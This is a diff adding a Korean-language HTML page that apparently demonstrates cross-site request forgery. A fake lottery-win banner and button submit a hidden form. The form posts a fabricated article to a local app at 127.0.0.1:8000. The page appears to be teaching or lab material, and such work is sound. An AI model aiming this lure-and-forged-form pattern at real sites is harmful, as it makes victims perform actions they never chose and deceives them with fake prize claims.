@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> CSRF 공격 데모</title>
+    <style>
+        body {
+            background: rgb(222, 222, 222);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 900px;
+            width: 100%;
+            text-align: center;
+            height: 350px;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+            font-size: 5em;
+        }
+
+
+        .btn {
+            background: rgb(204, 75, 75);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🎉축! 로또번호 당첨!✽</h1>
+        <!-- 악성 폼  -->
+        <form id="maliciousForm" action="http://127.0.0.1:8000/create/" method="POST">
+            <input type="hidden" name="title" value="⚠️ CSRF 공격!!!">
+            <input type="hidden" name="body" value="CSRF 공격으로 생성된 게시물">
+            <button type="submit" class="btn"><strong> 👉 로또번호 확인하러 가기</strong></button>
+        </form>
+
+    </div>
+
+</body>
+
+</html>
